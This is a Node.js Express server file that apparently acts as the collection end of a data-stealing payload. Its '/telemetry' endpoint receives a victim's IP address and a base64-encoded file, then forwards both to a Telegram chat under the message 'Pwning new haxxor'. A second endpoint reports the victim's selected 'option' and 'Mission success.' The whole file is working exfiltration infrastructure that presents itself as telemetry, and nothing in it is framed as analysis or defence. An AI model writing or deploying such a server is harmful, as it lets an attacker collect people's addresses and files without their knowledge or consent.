require("dotenv").config();
const express = require("express");
const rl = require("express-rate-limit");
const { Telegraf } = require("telegraf");

const { PORT, TOKEN, ID } = process.env;

if (!PORT || !TOKEN || !ID) throw "You need the README";

const bot = new Telegraf(TOKEN);
const app = express();

// app.use(
//   rl({
//     windowMs: 1000 * 60 * 15,
//     max: 5,
//   })
// );
app.use(express.json());

app.post("/telemetry", async (req, res) => {
  const { ip, props } = req.body;

  if (!ip || !props) return res.status(400).send("Bad Request");

  await bot.telegram.sendMessage(ID, "Pwning new haxxor");
  await bot.telegram.sendMessage(ID, `My IP: ${ip}`);

  const file = Buffer.from(props, "base64");
  await bot.telegram.sendDocument(ID, {
    filename: "props.txt",
    source: file,
  });

  return res.send("OK");
});

app.put("/telemetry", async (req, res) => {
  const { option } = req.body;

  if (!option) return res.status(400).send("Bad Request");

  await bot.telegram.sendMessage(ID, `Option ${option} selected`);
  await bot.telegram.sendMessage(ID, "Mission success. 👌");

  return res.send("OK");
});

app.listen(PORT, () => {
  console.log(`Started on :${PORT}`);
});
